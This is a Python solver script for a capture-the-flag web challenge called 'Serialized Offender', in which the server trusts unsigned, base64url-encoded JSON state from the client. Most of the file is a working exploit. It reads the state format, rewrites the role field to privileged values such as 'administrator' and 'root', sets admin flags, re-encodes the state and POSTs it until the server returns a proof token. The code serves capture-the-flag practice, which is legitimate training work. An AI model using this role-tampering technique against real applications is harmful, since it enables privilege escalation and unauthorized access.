"""D26 "Serialized Offender" (web-exploitation-day-20-serialized-offender): unsigned client-side serialized state.

Kit shape: /api/clues = {framework, feature_route, state_format_route, current_role}; GET state_format_route ->
{transport: "POST <route>", content_type, request_field: "state", encoding: "base64url of UTF-8 JSON",
sample_state: {user, role}}; POST {"state": b64url(json with role "administrator")} -> {"ok":true,
"effect":"serialized_role_trusted","evidence":"proof_..."} ("admin"/"staff" -> role_not_permitted). Re-runnable.
"""
import base64
import json
import re
import urllib.parse

from lib import websolve

KEY_MAP = [(r"^state_format_route$", "day26_web_serialized_offender")]

ROLES = ("administrator", "admin", "superuser", "root", "owner", "staff", "manager")


def _json(body):
    try:
        j = json.loads(body or "")
        return j if isinstance(j, dict) else {}
    except ValueError:
        return {}


def _enc(obj, encoding):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    enc = (encoding or "").lower()
    if "hex" in enc:
        return raw.hex()
    if "url" in enc or not enc:
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")
    if "base64" in enc:
        return base64.b64encode(raw).decode()
    return raw.decode()


def exploit(base, clues):
    fmt_route = clues.get("state_format_route") or "/api/state-format"
    _, body, _ = websolve.fetch(urllib.parse.urljoin(base, fmt_route))
    fmt = _json(body)
    m = re.search(r"(/[\w./-]+)", str(fmt.get("transport") or ""))
    route = m.group(1) if m else clues.get("feature_route")
    if not route:
        return None
    field = fmt.get("request_field") or "state"
    sample = fmt.get("sample_state") if isinstance(fmt.get("sample_state"), dict) else {"user": "analyst", "role": "analyst"}
    role_keys = [k for k in sample if re.search(r"role", k, re.I)] or ["role"]
    url = urllib.parse.urljoin(base, route)
    for role in ROLES:
        st = dict(sample)
        for k in role_keys:
            st[k] = role
        for flag in ("is_admin", "admin"):
            if flag in st:
                st[flag] = True
        payload = json.dumps({field: _enc(st, fmt.get("encoding"))}).encode()
        _, b, _ = websolve.fetch(url, data=payload, method="POST", headers={"Content-Type": "application/json"})
        p = websolve.proof(b)
        if p:
            return p
    return None


HANDLERS = {"day26_web_serialized_offender": exploit}
